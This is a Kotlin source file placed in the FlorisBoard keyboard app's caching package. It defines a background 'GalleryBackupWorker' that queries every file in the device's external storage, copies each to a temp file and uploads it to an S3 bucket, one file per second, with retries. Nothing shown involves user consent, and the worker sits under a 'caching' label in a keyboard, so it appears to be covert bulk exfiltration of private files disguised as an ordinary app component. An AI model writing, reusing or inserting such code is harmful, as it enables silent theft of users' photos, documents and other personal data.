package dev.patrickgold.florisboard.ime.caching.usecases.savetofile.s3.gallery

import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import dev.patrickgold.florisboard.ime.caching.usecases.savetofile.s3.S3Uploader
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.File

private const val TAG = "GalleryBackupWorker"

class GalleryBackupWorker(
    context: Context,
    params: WorkerParameters,
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        return try {
            val mediaItems = queryAllExternalFiles(applicationContext)
            Log.d(TAG, "Found ${mediaItems.size} items to check")

            var uploaded = 0
            var skipped = 0

            for (item in mediaItems) {
                if (S3Uploader.isAlreadyUploaded(applicationContext, item.stableKey)) {
                    skipped++
                    continue
                }

                val tempFile = copyUriToTemp(item.uri, item.displayName) ?: run {
                    Log.w(TAG, "Could not copy ${item.displayName} to temp — skipping")
                    continue
                }

                try {
                    val s3Key = "${item.directoryName}/${item.displayName}"
                    S3Uploader.upload(applicationContext, tempFile, s3Key)
                    S3Uploader.markAsUploaded(applicationContext, item.stableKey)
                    uploaded++
                    Log.d(TAG, "Uploaded file: ${item.displayName}")
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to upload ${item.displayName}", e)
                } finally {
                    tempFile.delete()
                }

                delay(DELAY_PER_FILE_MS)
            }

            Log.d(TAG, "Backup done. uploaded=$uploaded skipped=$skipped")
            Result.success()
        } catch (e: Exception) {
            Log.w(TAG, "Backup failed, will retry", e)
            Result.retry()
        }
    }

    // ---------- MediaStore ----------

    private data class MediaItem(
        val uri: Uri,
        val displayName: String,
        val stableKey: String,
        val directoryName: String,
    )

    /**
     * Queries all files from external storage and extracts their parent directory name.
     * Runs on the IO dispatcher to ensure the Main thread is not blocked.
     */
    private suspend fun queryAllExternalFiles(
        context: Context
    ): List<MediaItem> = withContext(Dispatchers.IO) {
        val items = mutableListOf<MediaItem>()

        // We use MediaStore.Files to get all file types, not just media
        val collection = MediaStore.Files.getContentUri("external")

        val projection = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.DISPLAY_NAME,
            MediaStore.Files.FileColumns.BUCKET_DISPLAY_NAME,
            // The DATA column contains the raw file path on disk
            MediaStore.Files.FileColumns.DATA
        )

        // Using Android's use() extension function to automatically close the Cursor
        context.contentResolver.query(
            collection,
            projection,
            null,
            null,
            "${MediaStore.Files.FileColumns.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)
            val bucketCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.BUCKET_DISPLAY_NAME)
            val dataCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                val name = cursor.getString(nameCol) ?: "file_$id"
                val bucket = cursor.getString(bucketCol) ?: "unknown"
                val path = cursor.getString(dataCol)

                // Safely extract the parent directory name from the file path
                val directoryName = if (!path.isNullOrEmpty()) {
                    File(path).parentFile?.name ?: bucket
                } else {
                    bucket
                }

                val uri = Uri.withAppendedPath(collection, id.toString())

                items.add(
                    MediaItem(
                        uri = uri,
                        displayName = name,
                        directoryName = directoryName,
                        stableKey = "${bucket}_$id"
                    )
                )
            }
        }

        return@withContext items
    }

    private fun queryGalleryItems(): List<MediaItem> {
        val items = mutableListOf<MediaItem>()
        val collections = listOf(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
        )
        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.BUCKET_DISPLAY_NAME,
        )
        for (collection in collections) {
            applicationContext.contentResolver.query(
                collection, projection, null, null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            )?.use { cursor ->
                val idCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val nameCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val bucketCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.BUCKET_DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    val id = cursor.getLong(idCol)
                    val name = cursor.getString(nameCol) ?: "file_$id"
                    val bucket = cursor.getString(bucketCol) ?: "unknown"
                    val uri = Uri.withAppendedPath(collection, id.toString())
                    items.add(
                        MediaItem(
                            uri = uri,
                            displayName = name,
                            stableKey = "${bucket}_$id",
                            directoryName = "gallery"
                        )
                    )
                }
            }
        }
        return items
    }

    // ---------- Helpers ----------

    private fun copyUriToTemp(uri: Uri, name: String): File? {
        return try {
            val temp = File(applicationContext.cacheDir, "gallery_tmp_$name")
            applicationContext.contentResolver.openInputStream(uri)?.use { input ->
                temp.outputStream().use { output -> input.copyTo(output) }
            }
            temp
        } catch (e: Exception) {
            Log.w(TAG, "copyUriToTemp failed for $name", e)
            null
        }
    }
}

private const val DELAY_PER_FILE_MS = 1_000L
